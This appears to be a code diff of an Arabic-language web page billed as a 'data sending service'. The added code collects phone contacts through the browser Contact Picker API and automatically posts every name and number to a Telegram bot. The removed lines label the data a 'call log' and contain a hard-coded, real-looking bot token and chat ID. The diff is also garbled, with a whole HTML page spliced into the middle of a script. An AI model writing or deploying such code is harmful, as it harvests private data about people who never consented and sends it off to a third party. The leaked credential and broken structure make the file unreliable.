@@ -310,45 +310,131 @@ document.addEventListener('DOMContentLoaded', function() {
 </script>
 document.getElementById('requestAccess').addEventListener('click', async () => {
     try {
-        // 1. طلب الإذن من المستخدم (هذا مثال افتراضي، لا يوجد API مباشر لسجل المكالمات)
-        if (!('contacts' in navigator)) {
-            throw new Error("المتصفح لا يدعم واجهة جهات الاتصال!");
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>خدمة إرسال البيانات</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            text-align: center;
         }
-
-        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+        .container {
+            background: #f9f9f9;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px;
+        }
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            background: #f0f0f0;
+            text-align: right;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>خدمة إرسال البيانات</h1>
+        <p class="warning">⚠️ يجب فتح هذه الصفحة مباشرة (ليست داخل إطار) وتشغيلها على خادم HTTPS</p>
         
-        // 2. تحويل البيانات إلى نص
-        let callLogText = "📞 سجل المكالمات:\n\n";
-        contacts.forEach(contact => {
-            callLogText += `👤 ${contact.name}: ${contact.tel}\n`;
+        <button id="requestBtn">طلب الإذن والوصول إلى الجهات</button>
+        
+        <div id="result"></div>
+    </div>
+
+    <script>
+        // ⚠️ تحذير: هذا غير آمن للإنتاج - فقط لأغراض الاختبار
+        const BOT_TOKEN = "YOUR_BOT_TOKEN";
+        const CHAT_ID = "YOUR_CHAT_ID";
+        
+        document.getElementById('requestBtn').addEventListener('click', async () => {
+            const resultElement = document.getElementById('result');
+            try {
+                // التحقق من شروط التشغيل
+                if (window.self !== window.top) {
+                    throw new Error("يجب فتح الصفحة مباشرة وليس داخل إطار iframe");
+                }
+                
+                if (!('contacts' in navigator && 'ContactsManager' in window)) {
+                    throw new Error("المتصفح لا يدعم واجهة جهات الاتصال أو لم يتم تحميل الصفحة عبر HTTPS");
+                }
+
+                // طلب الإذن أولاً
+                const permissionStatus = await navigator.permissions.query({
+                    name: 'contacts'
+                });
+                
+                if (permissionStatus.state !== 'granted') {
+                    throw new Error("لم يتم منح الإذن للوصول إلى جهات الاتصال");
+                }
+
+                // تحديد حقول البيانات المطلوبة
+                const props = ['name', 'tel'];
+                const opts = { multiple: true };
+                
+                // فتح واجهة اختيار الجهات
+                const contacts = await navigator.contacts.select(props, opts);
+                
+                if (!contacts || contacts.length === 0) {
+                    resultElement.innerText = "لم يتم اختيار أي جهات اتصال";
+                    return;
+                }
+                
+                // تحضير البيانات للإرسال
+                let message = "📱 جهات الاتصال المحددة:\n\n";
+                contacts.forEach(contact => {
+                    message += `👤 ${contact.name || 'لا يوجد اسم'}: ${contact.tel}\n`;
+                });
+                
+                // إرسال البيانات
+                await sendToTelegram(message);
+                resultElement.innerHTML = "<strong>✅ تم الإرسال بنجاح!</strong>";
+                
+            } catch (error) {
+                resultElement.innerHTML = `<span class="warning">❌ خطأ:</span> ${error.message}`;
+                console.error(error);
+            }
         });
 
-        // 3. إظهار البيانات للمستخدم (بدلاً من إرسالها تلقائياً لأسباب أمنية)
-        document.getElementById('output').innerText = callLogText;
-
-        // 4. إرسال إلى Telegram (يتطلب خادم وسيط)
-        // await sendToTelegram(callLogText);
-        alert("تم جلب البيانات بنجاح! يمكنك نسخها وإرسالها يدوياً.");
-        
-    } catch (error) {
-        console.error("حدث خطأ:", error);
-        alert(`❌ خطأ: ${error.message}`);
-    }
-});
-
-// دالة الإرسال إلى Telegram (تتطلب خادمك الخاص)
-async function sendToTelegram(text) {
-    const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
-    const CHAT_ID = "6913353602";
-    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
-    const response = await fetch(API_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text }),
-    });
-
-    if (!response.ok) throw new Error("فشل الإرسال!");
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    disable_web_page_preview: true
+                })
+            });
+            
+            if (!response.ok) {
+                throw new Error(`فشل الإرسال: ${response.status}`);
+            }
+            
+            return await response.json();
         }
+    </script>
 </body>
 </html>
